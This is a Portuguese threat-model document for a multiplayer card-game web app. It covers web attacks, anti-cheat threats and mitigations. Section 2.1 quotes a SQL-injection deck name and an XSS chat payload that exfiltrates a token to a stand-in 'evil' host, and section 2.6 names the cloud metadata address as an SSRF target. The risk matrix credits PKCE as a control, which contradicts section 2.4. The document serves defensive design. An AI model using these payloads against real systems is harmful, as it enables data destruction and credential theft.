# Threat Model & Segurança

| Campo                       | Valor                                                                                                                                                                                                                           |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ID**                      | `DOC-051`                                                                                                                                                                                                                       |
| **Versão**                  | 1.1                                                                                                                                                                                                                             |
| **Status**                  | Estável                                                                                                                                                                                                                         |
| **Última revisão**          | 2026-08-20                                                                                                                                                                                                                      |
| **Documentos relacionados** | [readme.md](readme.md) · [seguranca_e_privacidade.md](seguranca_e_privacidade.md) · [especificacao_do_motor_sandbox.md](especificacao_do_motor_sandbox.md) · [especificacao_da_api_backend.md](especificacao_da_api_backend.md) |

> Este documento **mapeia as ameaças**. Os controles que aplicamos estão em
> [seguranca_e_privacidade.md](seguranca_e_privacidade.md).

---

## 1. Escopo e superfícies de ataque

Como o AetherTable é um ambiente web multiplayer em tempo real, a superfície de ataque é
considerável.

| #   | Superfície                     | Exposição                          | Atrativo para o atacante             |
| --- | ------------------------------ | ---------------------------------- | ------------------------------------ |
| S1  | API REST pública               | Internet                           | Contas, decks, criação de sala       |
| S2  | WebSocket de jogo              | Internet, autenticado              | **Informação oculta dos oponentes**  |
| S3  | WebRTC / SFU                   | Internet                           | Áudio alheio, exaustão de banda      |
| S4  | Frontend (código no navegador) | Totalmente sob controle do usuário | Ponto de partida de qualquer trapaça |
| S5  | Integração com a Scryfall      | Saída                              | SSRF, envenenamento de dados         |
| S6  | Provedores OAuth               | Entrada/saída                      | Tomada de conta                      |
| S7  | Banco de dados                 | Rede privada                       | Dados pessoais                       |
| S8  | Pipeline CI/CD                 | Repositório                        | Cadeia de suprimentos                |
| S9  | Infraestrutura de nuvem        | Painéis administrativos            | Controle total                       |

### 1.1 Atores de ameaça

| Ator                      | Motivação         | Capacidade                                                        | Prioridade de defesa               |
| ------------------------- | ----------------- | ----------------------------------------------------------------- | ---------------------------------- |
| **Jogador trapaceiro**    | Ganhar a partida  | Alta no próprio cliente (DevTools, extensões, cliente modificado) | **Máxima**                         |
| Vândalo / _script kiddie_ | Diversão, caos    | Média (ferramentas prontas, DDoS de aluguel)                      | Alta                               |
| Coletor de credenciais    | Revenda de contas | Média (força bruta, _credential stuffing_)                        | Alta                               |
| Concorrente / _scraper_   | Extrair dados     | Baixa (dados de carta já são públicos)                            | Baixa                              |
| Insider (colaborador)     | Variada           | Alta                                                              | Média                              |
| Atacante direcionado      | Alvo específico   | Alta                                                              | Baixa (perfil de risco do produto) |

### 1.2 Ativos a proteger, em ordem

1. **Informação oculta em partida** (mão e grimório) — comprometer isso destrói o produto.
2. **Contas de usuário** — e-mail e credenciais.
3. **Disponibilidade das salas** — partida interrompida é a pior experiência.
4. Decks dos usuários.
5. Integridade da aleatoriedade.
6. Reputação e conformidade legal.

---

## 2. Ameaças de aplicação web (OWASP)

### 2.1 Injeção de dados (XSS / SQLi)

**Vetor.** Usuário cola script malicioso no chat, ou importa um deck cujo nome é uma cadeia de SQLi.
Exemplos: nome de deck `Robert'); DROP TABLE decks;--`; mensagem de chat
`<img src=x onerror="fetch('//evil/'+localStorage.token)">`.

| Camada                  | Mitigação                                                                                                           |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------- |
| **Backend — SQL**       | **Prisma ORM** com _parameterized queries_. Nenhum SQL concatenado à mão.                                           |
| **Backend — validação** | **Zod** em todo _payload_ de API e WebSocket. `deck_name` aceita apenas letras Unicode, dígitos, espaço e `- ' , .` |
| **Frontend — DOM**      | React escapa strings automaticamente ao renderizar em nós de texto                                                  |
| **Frontend — chat**     | Renderização de HTML puro **desabilitada**; markdown sanitizado; `DOMPurify` antes de exibir                        |
| **CSP**                 | `default-src 'self'` bloqueia execução de script injetado inline                                                    |
| **Cookie**              | _Refresh token_ em cookie `HttpOnly` — XSS não consegue lê-lo                                                       |

**Risco residual.** XSS refletido em página de erro mal implementada. Mitigação: revisão de todo ponto
que ecoa parâmetro de query.

**Severidade:** Alta · **Probabilidade após mitigação:** Baixa

### 2.2 Roubo de sessão e CSRF

**Vetor.** O atacante induz o navegador do usuário autenticado a fazer uma requisição não intencional
— por exemplo, excluir um deck a partir de um site malicioso.

| Mitigação         | Detalhe                                                                                                                               |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| **JWT em header** | Autenticação por `Authorization: Bearer`, **não** por cookie de sessão. Um `<form>` de outro site não consegue adicionar esse header. |
| _Refresh token_   | Cookie `SameSite=Strict` — não é enviado em requisição _cross-site_                                                                   |
| CORS              | Lista explícita de origens permitidas                                                                                                 |
| Rotação           | _Refresh_ rotativo; reuso invalida toda a família                                                                                     |
| TTL curto         | _Access token_ de 15 min limita a janela de um token vazado                                                                           |

**Severidade:** Alta · **Probabilidade após mitigação:** Muito baixa

### 2.3 Negação de serviço (DDoS / abuso de API)

**Vetor.** Um bot cria 1.000 contas por minuto, ou instancia 10.000 salas WebSocket, derrubando o
servidor.

| Camada                   | Mitigação                                                                                                     |
| ------------------------ | ------------------------------------------------------------------------------------------------------------- |
| **Camada 1 — borda**     | Cloudflare com proteção DDoS; modo "Under Attack" acionável para a página de criação de sala                  |
| **Camada 2 — API**       | _Rate limiting_ no gateway (NestJS + Redis): **3 criações de sala por hora** por usuário; 5 logins/min por IP |
| **Camada 3 — WebSocket** | 30 intenções/s por conexão; mensagem acima de 4 KB fecha a conexão                                            |
| **Camada 4 — recursos**  | Teto de 200 fichas por jogador; descarte de sala vazia em 10 min; teto de salas por nó                        |
| **Camada 5 — cadastro**  | Verificação de e-mail para conta local; OAuth reduz contas descartáveis                                       |

**Ponto de atenção específico de WebSocket:** conexão persistente consome memória no servidor mesmo
sem tráfego. Um atacante pode abrir milhares de conexões inertes. Mitigação: exigir `seatToken` válido
**antes** de alocar assento, e _heartbeat_ de 15 s com desconexão em 45 s.

**Severidade:** Alta · **Probabilidade:** Média (ataque barato e comum)

### 2.4 Tomada de conta (ATO)

| Vetor                                   | Mitigação                                                                                       |
| --------------------------------------- | ----------------------------------------------------------------------------------------------- |
| Força bruta de senha                    | 5 tentativas/min por IP; Argon2id torna cada tentativa caro                                     |
| _Credential stuffing_                   | Senha verificada contra lista de vazamentos conhecidos — **não implementado**                   |
| Enumeração de contas                    | Erros genéricos em login e recuperação — nunca "e-mail não existe"                              |
| Sequestro de fluxo OAuth                | `state` aleatório validado por cookie (_double submit_); **PKCE não implementado** — ver abaixo |
| **Provedor com e-mail não verificado**  | O vínculo por e-mail exige `email_verified` do provedor; ausência conta como não verificado     |
| Vinculação indevida de provedor         | Vincular Google/Discord a conta existente exige confirmação explícita — **não implementado**    |
| Sessão persistente após comprometimento | Troca **e redefinição** de senha invalidam todas as sessões (`FR-19`)                           |
| **Link de redefinição vazado do banco** | A tabela guarda **SHA-256** do token, nunca o texto                                             |
| **Reuso do link de redefinição**        | Uso único (`used_at`) + validade de 30 min + cada pedido novo invalida os anteriores            |

#### O `state` estava neste documento e não existia no código

Esta linha dizia "`state` aleatório validado + PKCE". **Nenhum dos dois existia.** Sem a opção `store`
(ou `state: true`), o `passport-oauth2` instala um `NullStore` e o `state` simplesmente não é
verificado — `passport-oauth2/lib/strategy.js:113`. É o caso exato que a política de documentação
descreve: o documento fazia quem auditasse concluir que um controle estava lá.

O ataque é **login CSRF**, e o resultado é contraintuitivo: o atacante inicia o fluxo com a própria
conta Google, captura o `code` do redirect e faz o navegador da vítima abrir o nosso callback com
ele. A vítima termina logada **na conta do atacante**, monta decks e entra em mesas ali, e o atacante
lê tudo quando quiser.

Agora o `state` é gerado por `randomBytes`, guardado num cookie `httpOnly; SameSite=Lax; Path=/api/v1/auth`
de 10 minutos, e comparado em tempo constante no callback. **Cookie e não sessão de servidor:** a API é
sem estado por construção (JWT no cabeçalho), e `state: true` exigiria `express-session` — estado
compartilhado entre nós por causa de um valor que vive 10 minutos.

**PKCE continua fora, por decisão registrada.** Ele protege cliente PÚBLICO (aplicativo nativo, SPA),
onde o `code` pode ser interceptado e não há segredo para impedir a troca. Aqui o cliente é
CONFIDENCIAL: a troca acontece no servidor, com `client_secret`, sobre TLS.

#### O vínculo por e-mail é o ponto frágil do OAuth, e ele foi fechado

Quando a identidade do provedor ainda não tem linha em `accounts`, a conta local é encontrada **pelo
e-mail**. Isso torna a confiança no provedor absoluta naquele instante, e abre a sequência:

1. a vítima tem conta local com `vitima@exemplo.com` e senha própria;
2. o atacante cria uma conta no provedor declarando **esse mesmo endereço**;
3. o provedor entrega o perfil com o e-mail **não verificado**;
4. casamos por e-mail e o atacante entra na conta da vítima.

O Google verifica sempre e informa `email_verified`. **O Discord permite conta com e-mail não
confirmado** e informa `verified` — o passo 3 é literal ali. A checagem é falha fechada: campo ausente
conta como não verificado, e a recusa vira `?erro=email_nao_verificado` na tela de entrada.

#### A recuperação de senha não pode virar um verificador de cadastro

`POST /auth/senha/esqueci` responde **`202` com o mesmo corpo** para conta inexistente, banida,
suspensa e de OAuth. Duas consequências que não são óbvias:

- **Falha de entrega não muda a resposta.** Propagar o erro do provedor de e-mail seria a reabertura
  do vazamento pela porta dos fundos: e-mail inexistente sairia com `202` e e-mail existente com o
  provedor fora do ar sairia com `503` — a diferença entre as duas respostas é exatamente a pergunta
  que a rota existe para não responder. O erro vai para o log.
- **Configuração ausente, sim.** `RESEND_API_KEY` vazio em produção responde `503` para **todo**
  e-mail, igualmente, então não distingue conta nenhuma — e precisa ser barulhento, porque o
  contrário é uma tela dizendo "enviamos o link" sem ter enviado.

**Severidade:** Alta · **Probabilidade:** Média

### 2.5 Controle de acesso quebrado (IDOR)

**Vetor.** `GET /decks/<uuid-de-outro-usuário>` ou `DELETE /decks/<id-alheio>`.

| Mitigação                  | Detalhe                                                                  |
| -------------------------- | ------------------------------------------------------------------------ |
| Verificação de propriedade | Toda consulta de deck filtra por `user_id` do token, não apenas por `id` |
| Resposta a acesso negado   | **`404`, não `403`** — não revela a existência do recurso                |
| IDs não sequenciais        | UUID v4, não inteiro incremental                                         |
| Deck público               | Só acessível por terceiros quando `is_public = true`                     |

**Severidade:** Média · **Probabilidade após mitigação:** Baixa

### 2.6 SSRF via integração externa

**Vetor.** Um campo que aceite URL (playmat customizado, avatar) poderia ser usado para forçar o
servidor a requisitar `http://169.254.169.254/` (metadados da instância na nuvem).

| Mitigação                     | Detalhe                                                                                                    |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Sem _fetch_ de URL arbitrária | O backend só chama **domínios em lista de permissão** (`api.scryfall.com`)                                 |
| Upload de playmat             | Vai para armazenamento de objetos com validação de tipo e tamanho — **não** é uma URL que o servidor busca |
| Avatar OAuth                  | URL usada apenas pelo navegador no `<img>`, nunca requisitada pelo servidor                                |
| Rede                          | Game server e API sem acesso de saída a faixas de IP internas                                              |

**Severidade:** Alta se existir · **Probabilidade:** Baixa (por design)

### 2.7 Cadeia de suprimentos

| Vetor                                  | Mitigação                                                                      |
| -------------------------------------- | ------------------------------------------------------------------------------ |
| Pacote npm malicioso                   | Lockfile versionado; Renovate/Dependabot com revisão humana; `npm audit` no CI |
| _Typosquatting_                        | Revisão de toda dependência nova adicionada em PR                              |
| Segredo comprometido no CI             | _Secret scanning_; escopo mínimo de tokens; rotação                            |
| Comprometimento de conta de mantenedor | 2FA obrigatória no GitHub; proteção de branch                                  |

**Severidade:** Crítica · **Probabilidade:** Baixa

---

## 3. Ameaças específicas do jogo (anti-cheat)

Esta é a categoria mais importante do documento — é aqui que o produto se prova ou se desmoraliza.

### 3.1 Packet sniffing (leitura de dados da rede)

**Ameaça.** Um jogador inspeciona o painel _Network → WS_ do Chrome para ler os _payloads_ recebidos.
Se o servidor enviar o ID das cartas do deck ou da mão dos oponentes "escondido" no código, o atacante
saberá exatamente o que o outro tem.

**Não é hipótese remota:** é o ataque mais provável do produto, custa dois cliques e não exige nenhuma
ferramenta especial.

**Mitigação rigorosa — `@filter` do Colyseus.** O backend implementa filtro dinâmico de visibilidade nas
propriedades sensíveis do objeto `Card`:

```ts
@filter(function (this: Card, client: { sessionId: string }) {
  // Se estiver no campo, mostra para todos...
  if (this.zone === 'BATTLEFIELD') {
    // ...exceto se estiver face para baixo: aí só o controlador sabe qual é.
    if (this.faceDown) return client.sessionId === this.controllerId;
    return true;
  }
  // Cemitério, exílio e zona de comando são públicos.
  if (['GRAVEYARD', 'EXILE', 'COMMAND'].includes(this.zone)) return true;

  // Mão: só o dono recebe a identidade da carta.
  if (this.zone === 'HAND') return client.sessionId === this.ownerId;

  // Grimório: ninguém recebe — nem o dono (ver DOC-050 §2.4).
  return false;
})
@type('string') scryfallId!: string;
```

Para o atacante, o pacote de rede referente à mão do oponente é **literalmente vazio de informação
sensível**. Não há o que decodificar, porque o dado nunca saiu do servidor.

**Severidade:** Crítica · **Probabilidade após mitigação:** Muito baixa
**Verificação obrigatória:** teste `G1` em CI — capturar o tráfego WS de um cliente oponente e assertar
ausência de `scryfallId` e `name` de zona oculta. Falha no teste **bloqueia o merge**.

### 3.2 Cliente modificado enviando intenções ilegítimas

**Ameaça.** O atacante altera o JavaScript (ou usa um cliente próprio) para enviar
`INTENT_DRAW { amount: 20 }`, mover cartas do oponente ou definir a própria vida em 9999.

| Intenção maliciosa                   | Defesa                                                                                                                       |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------- |
| `INTENT_DRAW { amount: 9999 }`       | Zod limita a 1–100; e a `LIBRARY` tem tamanho finito                                                                         |
| Mover carta de outro jogador         | `controllerId !== sessionId` → rejeitado + log de auditoria (`FR-12`)                                                        |
| Comprar do grimório alheio           | `ownerId !== sessionId` → rejeitado                                                                                          |
| `INTENT_SET_LIFE { absolute: 9999 }` | **Permitido** — e visível no log para todos. Ajustar vida é ação legítima na mesa; trapaça grosseira é detectada socialmente |
| Criar 100.000 fichas                 | Teto de 50/intenção e 200/jogador                                                                                            |
| Estado inventado                     | **Impossível**: o cliente não envia estado, só intenção (`RN07`)                                                             |
| Campo desconhecido no payload        | Zod em modo estrito descarta                                                                                                 |

**Insight de projeto:** a arquitetura de intenções torna categorias inteiras de trapaça
_inexprimíveis_. Não existe mensagem que o cliente possa enviar dizendo "esta carta agora é minha" —
o vocabulário do protocolo simplesmente não tem essa frase.

**Severidade:** Alta · **Probabilidade após mitigação:** Baixa

### 3.3 Manipulação de aleatoriedade

| Ameaça                                       | Mitigação                                                                             |
| -------------------------------------------- | ------------------------------------------------------------------------------------- |
| Rolar dado no cliente e reportar o resultado | Todo RNG é do servidor (`RN06`, `FR-09`)                                              |
| Prever o embaralhamento observando rolagens  | `crypto.randomInt` (CSPRNG), nunca `Math.random()`                                    |
| Repetir a rolagem até dar bom                | _Rate limit_ de 5 rolagens/10 s; **toda** rolagem vai ao log, inclusive as ruins      |
| Embaralhar até obter ordem favorável         | O jogador não vê o resultado do embaralhamento — a `LIBRARY` é oculta até para o dono |

**Severidade:** Média · **Probabilidade após mitigação:** Muito baixa

### 3.4 Espionagem por espectador (V2)

**Ameaça.** Um aliado entra como espectador, vê a mão de todos e passa a informação por Discord.

| Mitigação              | Detalhe                                                                                    |
| ---------------------- | ------------------------------------------------------------------------------------------ |
| Filtro mais restritivo | Espectador não é `ownerId` de nada, então o `@filter` naturalmente não entrega zona oculta |
| Teste explícito        | Auditoria de pacote **com um espectador conectado** é caso de teste próprio                |
| Controle do host       | Espectadores desabilitados por padrão                                                      |
| Delay opcional         | Para partidas com transmissão, considerar atraso de 30 s no feed do espectador (pós-V2)    |

**Severidade:** Alta · **Probabilidade:** Média se não houver teste específico

### 3.5 Vazamento por canal secundário

| Canal                 | Ameaça                                               | Mitigação                                                             |
| --------------------- | ---------------------------------------------------- | --------------------------------------------------------------------- |
| Log de ações          | "Jogador A comprou Sol Ring"                         | Variantes `_HIDDEN` obrigatórias (`RN09`)                             |
| Evento de revelação   | `broadcast` em vez de `send`                         | `revealToOwner` **sempre** com `client.send()`                        |
| Mensagem de erro      | Nome de carta em `error`/`warning`                   | Proibido citar carta de zona oculta                                   |
| Requisição de imagem  | Buscar a arte revela a carta a um observador de rede | Nenhuma imagem é requisitada para `LIBRARY` (`FR-23`)                 |
| Métricas / telemetria | Rótulo por `scryfallId`                              | Métricas nunca rotuladas por carta                                    |
| Tamanho do pacote     | Inferência estatística sobre o volume do _patch_     | Risco residual aceito: o `@filter` produz pacotes de tamanho parecido |
| Tempo de resposta     | Diferença de latência revelando ramo de código       | Risco residual aceito; irrelevante na prática                         |

**Severidade:** Alta · **Probabilidade:** Média (é fácil esquecer o log)

### 3.6 Sequestro de sala

| Ameaça                       | Mitigação                                                                                                   |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------- |
| Adivinhar `roomId`           | 6 caracteres de um alfabeto de 32 → ~10⁹ combinações; senha opcional; _rate limit_ na tentativa de ingresso |
| Reutilizar `seatToken`       | Uso único, TTL de 60 s, vinculado ao `roomId`                                                               |
| Entrar na sala de voz alheia | JWT do LiveKit com `room` no claim                                                                          |
| Força bruta de senha de sala | 3 tentativas e espera de 30 s por IP                                                                        |
| Sala de jogador bloqueado    | Verificação de bloqueio no ingresso (`F36`)                                                                 |

**Severidade:** Média · **Probabilidade:** Baixa

### 3.7 Abuso e toxicidade

| Ameaça                                    | Mitigação                                                        |
| ----------------------------------------- | ---------------------------------------------------------------- |
| Assédio por voz                           | _Mute_ local imediato; bloqueio; report (`RF03`)                 |
| Spam de chat                              | 10 mensagens/10 s; máx. 500 caracteres                           |
| Conteúdo abusivo em nome de deck ou ficha | Validação de caracteres; report; moderação                       |
| Playmat com imagem imprópria              | Upload de cosmético revisado (recurso de apoiador, volume baixo) |
| _Griefing_ (embaralhar a mesa e sair)     | Log completo; bloqueio; salas privadas por padrão                |

**Severidade:** Média · **Probabilidade:** Média em salas públicas (V2)

---

## 4. Matriz consolidada de risco

| #   | Ameaça                               | Superfície | Severidade | Prob.       | Risco    | Controle principal                    |
| --- | ------------------------------------ | ---------- | ---------- | ----------- | -------- | ------------------------------------- |
| T1  | **Packet sniffing de zona oculta**   | S2         | Crítica    | Baixa*      | **Alto** | `@filter` + teste `G1`                |
| T2  | Vazamento por log / canal secundário | S2         | Alta       | Média       | **Alto** | `RN09` + revisão                      |
| T3  | DDoS / exaustão de WebSocket         | S2, S9     | Alta       | Média       | **Alto** | Cloudflare + _rate limit_ + heartbeat |
| T4  | Tomada de conta                      | S1, S6     | Alta       | Média       | **Alto** | Argon2id + PKCE + _rate limit_        |
| T5  | Cadeia de suprimentos                | S8         | Crítica    | Baixa       | Médio    | Lockfile + scan + 2FA                 |
| T6  | Espectador espião (V2)               | S2         | Alta       | Média       | Médio    | Filtro + teste específico             |
| T7  | Cliente modificado                   | S4         | Alta       | Baixa       | Médio    | Zod + autorização por intenção        |
| T8  | XSS no chat                          | S1, S4     | Alta       | Baixa       | Médio    | DOMPurify + CSP + sem HTML            |
| T9  | IDOR em decks                        | S1         | Média      | Baixa       | Baixo    | Filtro por `user_id` + `404`          |
| T10 | CSRF                                 | S1         | Alta       | Muito baixa | Baixo    | JWT em header + SameSite              |
| T11 | SSRF                                 | S5         | Alta       | Baixa       | Baixo    | Lista de permissão de domínio         |
| T12 | Manipulação de RNG                   | S4         | Média      | Muito baixa | Baixo    | CSPRNG no servidor                    |
| T13 | Toxicidade                           | S3         | Média      | Média       | Médio    | Mute, bloqueio, report                |
| T14 | SQLi                                 | S1         | Crítica    | Muito baixa | Baixo    | Prisma + Zod                          |

\* A probabilidade de T1 é baixa **somente enquanto o teste `G1` estiver ativo no CI**. Sem ele, sobe
para alta — é um erro de uma linha esquecer o `@filter` num campo novo.

---

## 5. Controles por camada (defesa em profundidade)

```
┌─────────────────────────────────────────────────────────────┐
│ BORDA — Cloudflare                                          │
│   DDoS · WAF · rate limit por IP · TLS · cache               │
├─────────────────────────────────────────────────────────────┤
│ APLICAÇÃO — API Core                                        │
│   JWT · Argon2id · Zod · rate limit Redis · CORS · headers   │
├─────────────────────────────────────────────────────────────┤
│ ESTADO — Game Server                                        │
│   seatToken de uso único · Zod por intenção ·                │
│   autorização por ownerId/controllerId · @filter ·           │
│   CSPRNG · lock de arraste · limites anti-abuso              │
├─────────────────────────────────────────────────────────────┤
│ DADOS — PostgreSQL / Redis                                  │
│   rede privada · TLS · usuário sem DDL · backup cifrado      │
├─────────────────────────────────────────────────────────────┤
│ PROCESSO — CI/CD                                            │
│   secret scanning · audit · teste G1 · revisão de Schema     │
└─────────────────────────────────────────────────────────────┘
```

Nenhuma camada é suficiente sozinha. A camada de **estado** é a única que protege o ativo nº 1
(informação oculta) — e é por isso que ela concentra os controles mais rígidos e o único teste que
bloqueia release por conta própria.

---

## 6. Plano de verificação

| Verificação                                 | Frequência                                 | Bloqueia release?              |
| ------------------------------------------- | ------------------------------------------ | ------------------------------ |
| **Auditoria de pacote WS (`G1`)**           | Cada PR que toca o `Schema` + cada release | **Sim**                        |
| Auditoria de pacote com espectador          | Cada release (V2)                          | **Sim**                        |
| `npm audit` / scan de dependências          | Cada PR                                    | Sim (alta/crítica)             |
| _Secret scanning_                           | Cada PR                                    | Sim                            |
| Lint proibindo `Math.random` no game server | Cada PR                                    | Sim                            |
| Teste χ² do RNG                             | Semanal                                    | Não                            |
| _Fuzzing_ de intenções WS                   | Noturno                                    | Não                            |
| Teste de _rate limit_                       | Cada release                               | Sim                            |
| Verificação de headers de segurança         | Cada deploy                                | Sim                            |
| Revisão manual de campo novo em `Card`      | Cada PR                                    | **Sim**                        |
| Pentest externo                             | Antes do lançamento público e anualmente   | Sim, para achados crítico/alto |

---

## 7. Riscos aceitos

Registro explícito do que **não** vamos mitigar, e por quê:

| Risco aceito                                 | Justificativa                                                  |
| -------------------------------------------- | -------------------------------------------------------------- |
| Conluio por canal externo (Discord paralelo) | Fora do sistema; impossível detectar                           |
| Compartilhamento de tela com aliado          | Idem                                                           |
| Trapaça de regras (ignorar custo de mana)    | Não há motor de regras (`RN01`); é escolha de produto          |
| Inferência por tamanho de pacote             | Ganho marginal para o atacante; custo alto de mitigar          |
| Ataque de canal temporal                     | Irrelevante no contexto de um jogo casual                      |
| Perda de sala em reinício do nó              | Aceito no MVP (`ADR-006`); revisão prevista                    |
| Canvas opaco para leitores de tela           | Mitigado parcialmente por `aria-live`; limitação da tecnologia |
